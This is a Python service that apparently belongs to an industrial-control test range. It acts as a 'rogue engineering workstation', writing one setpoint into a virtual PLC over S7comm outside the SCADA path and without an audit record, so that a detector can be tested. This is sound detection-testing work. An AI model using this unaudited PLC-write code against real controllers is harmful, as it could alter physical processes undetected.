"""PS4A injector: a rogue engineering workstation (SCENARIOS 2.4).

This is not a PLC. It is a stand-alone process that writes one setpoint into a running vPLC over
S7comm, the way an unsanctioned engineering workstation would. It does not use the SCADA write path
and it writes no ledger row, so the change has no audit trail. VISR must catch it as an unsigned
setpoint change.

It runs the vPLC image (skn/vplc), which already carries python-snap7, but it never imports the
vPLC runtime. It only speaks the protocol to the real PLC named by EWS_TARGET.

  GET  /healthz      200 "ok"
  GET  /state        {active, target, address, value, last_write_ts, last_error}
  POST /fault/PS4A   one S7comm db_write of a big-endian INT (EWS_VALUE) to DB EWS_DB byte EWS_BYTE
                     on EWS_TARGET:EWS_PORT (rack 0, slot 1). 200 on success, 502 on a write error.
  POST /reset        clear the active flag. It writes nothing to the PLC.

Every POST needs header X-Scada-Token equal to SCADA_WRITE_TOKEN. An empty token turns the POST
endpoints off (403), so the injector without a token fails closed. A bad token is 401.

Env: EWS_HTTP_PORT (8090) · EWS_TARGET · EWS_PORT (102) · EWS_DB (1) · EWS_BYTE (292) ·
     EWS_VALUE (30) · SCADA_WRITE_TOKEN · BIND_HOST (0.0.0.0).
"""
from __future__ import annotations

import hmac
import json
import os
import struct
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlsplit

EWS_HTTP_PORT = int(os.environ.get("EWS_HTTP_PORT", "8090"))
BIND_HOST = os.environ.get("BIND_HOST") or "0.0.0.0"
TARGET = os.environ.get("EWS_TARGET", "plc-stamping.fleet.svc.cluster.local")
PORT = int(os.environ.get("EWS_PORT", "102"))
DB = int(os.environ.get("EWS_DB", "1"))
BYTE = int(os.environ.get("EWS_BYTE", "292"))
VALUE = int(os.environ.get("EWS_VALUE", "30"))
RACK, SLOT = 0, 1
WRITE_TOKEN = os.environ.get("SCADA_WRITE_TOKEN", "")
MAX_BODY = 64 * 1024

_lock = threading.Lock()
STATE = {"active": False, "last_write_ts": None, "last_error": None}


def _address() -> str:
    return f"DB{DB}.DBW{BYTE}"


def _view() -> dict:
    return {
        "active": STATE["active"],
        "target": f"{TARGET}:{PORT}",
        "address": _address(),
        "value": VALUE,
        "last_write_ts": STATE["last_write_ts"],
        "last_error": STATE["last_error"],
    }


def state() -> dict:
    """GET /state body."""
    with _lock:
        return _view()


def _gate(token: str | None) -> tuple[int, dict] | None:
    """None when the token is good, else (code, body). An empty token fails closed (403)."""
    if not WRITE_TOKEN:
        return 403, {"error": "injector disabled: SCADA_WRITE_TOKEN is empty"}
    if not token or not hmac.compare_digest(WRITE_TOKEN.encode(), token.encode()):
        return 401, {"error": "X-Scada-Token does not match"}
    return None


def _s7_write(host: str, port: int, db: int, byte: int, value: int) -> None:
    """One S7comm db_write of a big-endian INT. Imported here so the module carries no PLC state."""
    import snap7

    client = snap7.Client()
    try:
        client.connect(host, RACK, SLOT, port)
        client.db_write(db, byte, bytearray(struct.pack(">h", int(value))))
    finally:
        try:
            client.disconnect()
        except Exception:
            pass


def fault_ps4a(token: str | None) -> tuple[int, dict]:
    """POST /fault/PS4A. Write the setpoint over S7comm, with no SCADA path and no ledger row."""
    denied = _gate(token)
    if denied:
        return denied[0], {"active": STATE["active"], **denied[1]}
    try:
        _s7_write(TARGET, PORT, DB, BYTE, VALUE)
    except Exception as e:
        with _lock:
            STATE["last_error"] = str(e) or e.__class__.__name__
        print(f"rogue-ews: PS4A write to {TARGET}:{PORT} failed ({e})", flush=True)
        return 502, {"active": STATE["active"], "error": f"S7 write failed: {e}"}
    with _lock:
        STATE["active"] = True
        STATE["last_write_ts"] = time.time()
        STATE["last_error"] = None
    print(f"rogue-ews: PS4A wrote {VALUE} to {TARGET} {_address()} (no ledger row)", flush=True)
    return 200, state()


def reset(token: str | None) -> tuple[int, dict]:
    """POST /reset. Clear the active flag. It does not touch the PLC."""
    denied = _gate(token)
    if denied:
        return denied[0], {"active": STATE["active"], **denied[1]}
    with _lock:
        STATE["active"] = False
    print("rogue-ews: reset (active cleared, PLC untouched)", flush=True)
    return 200, state()


class Handler(BaseHTTPRequestHandler):
    def _send(self, code, body, ctype="application/json"):
        data = body if isinstance(body, bytes) else json.dumps(body).encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _body(self):
        try:
            length = int(self.headers.get("Content-Length") or 0)
        except ValueError:
            raise ValueError("bad Content-Length")
        if length > MAX_BODY:
            raise ValueError("body too large")
        raw = self.rfile.read(length) if length > 0 else b""
        try:
            return json.loads(raw or b"null")
        except Exception:
            raise ValueError("body is not valid JSON")

    def do_GET(self):
        path = urlsplit(self.path).path
        if path == "/healthz":
            return self._send(200, b"ok\n", "text/plain")
        if path == "/state":
            return self._send(200, state())
        self._send(404, {"error": "not found"})

    def do_POST(self):
        path = urlsplit(self.path).path
        if path not in ("/fault/PS4A", "/reset"):
            return self._send(404, {"error": "not found"})
        try:
            self._body()                                 # drain and validate any body
        except ValueError as e:
            return self._send(400, {"error": str(e)})
        token = self.headers.get("X-Scada-Token")
        if path == "/fault/PS4A":
            code, out = fault_ps4a(token)
        else:
            code, out = reset(token)
        self._send(code, out)

    def log_message(self, *a):                            # quiet access log
        pass


def main():
    print(f"rogue-ews up on :{EWS_HTTP_PORT} | target {TARGET}:{PORT} {_address()} = {VALUE} | "
          f"POSTs {'enabled' if WRITE_TOKEN else 'DISABLED (SCADA_WRITE_TOKEN empty)'}", flush=True)
    ThreadingHTTPServer((BIND_HOST, EWS_HTTP_PORT), Handler).serve_forever()


if __name__ == "__main__":
    main()
